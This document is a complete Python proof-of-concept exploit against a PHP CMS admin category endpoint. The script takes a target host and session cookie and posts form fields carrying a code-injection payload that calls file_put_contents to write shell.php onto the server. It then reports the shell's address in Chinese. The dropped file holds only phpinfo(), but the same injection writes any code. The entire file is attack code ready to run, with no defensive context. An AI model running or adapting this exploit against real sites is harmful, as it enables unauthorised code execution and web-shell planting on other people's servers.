import requests
import sys


def send_request(host, cookie):
    url = f"http://{host}/portal/admin_category/addpost.html"
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": f"http://{host}",
        "Referer": f"http://{host}/portal/admin_category/add.html",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": cookie,
        "Connection": "close"
    }

    payload = {
        "parent_id": "0",
        "name": "1'=>array(''),file_put_contents('shell.php','<?php phpinfo();?>'),'2",
        "alias": "1'=>array(''),file_put_contents('shell.php','<?php phpinfo();?>'),'2",
        "description": "1'=>array(''),file_put_contents('shell.php','<?php phpinfo();?>'),'2",
        "more[thumbnail]": "",
        "seo_title": "",
        "seo_keywords": "",
        "seo_description": "",
        "list_tpl": "list",
        "one_tpl": "article"
    }

    response = requests.post(url, headers=headers, data=payload)
    shell = f"http://{host}/shell.php"
    if "添加成功" in response.text and response.status_code == 200:
        print(f"phpinfo()已写入shell.php，地址为{shell}")
    else:
        print("phpinfo()写入失败")


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python poc.py host cookie")
    else:
        host = sys.argv[1]
        cookie = sys.argv[2]
        send_request(host, cookie)



